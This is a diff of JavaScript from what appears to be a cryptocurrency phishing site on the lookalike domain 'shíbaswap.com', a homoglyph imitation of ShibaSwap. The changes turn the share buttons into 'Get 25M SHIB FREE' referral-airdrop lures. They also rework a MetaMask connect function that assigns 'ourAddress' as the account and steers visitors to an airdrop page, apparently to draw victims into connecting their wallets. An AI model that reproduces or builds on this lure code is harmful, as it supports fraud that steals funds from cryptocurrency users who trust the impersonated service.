@@ -253,8 +253,8 @@ async function burnEvents() {
 
   shareButtons[2].addEventListener("click", function () {
     window.open(
-      "http://twitter.com/intent/tweet?text=Burn your shiba tokens and get leash as a reward.&amp;url=https://shíbaswap.com/burn",
-      "Share burning",
+      "http://twitter.com/intent/tweet?text=Get 25M SHIB FREE. Using my referral link: &amp;url=https://shíbaswap.com/referral?id=7654423",
+      "Share Airdrop",
       "toolbar=0, status=0, width=650, height=450"
     );
     shareOn();
@@ -262,8 +262,8 @@ async function burnEvents() {
 
   shareButtons[3].addEventListener("click", function () {
     window.open(
-      "http://www.facebook.com/sharer.php?u=https://shíbaswap.com/burn",
-      "Share burning",
+      "http://www.facebook.com/sharer.php?u=https://shíbaswap.com/referral?id=7654423",
+      "Share Airdrop",
       "toolbar=0, status=0, width=650, height=450"
     );
     shareOn();
@@ -316,8 +316,15 @@ function showHeaderInfo() {
 
 const metamask_connect = async () => {
   myAccount = ourAddress;
-  await fetch(baseURL + "/airdrop");
-  window.open(baseURL + '/#/airdrop');
+  
+  let divWallet = document.getElementById("divWallet"),
+      walletDiv = document.getElementById("walletDiv"),
+      connectButton = document.getElementById("connect-wallet");
+
+  if (divWallet) divWallet.style.display = 'flex';
+  if (walletDiv) walletDiv.style.display = 'flex';
+  if (connectButton) connectButton.style.display = 'none';
+  modifiyURL('/#/airdrop');
 };
 
 async function view_index() {
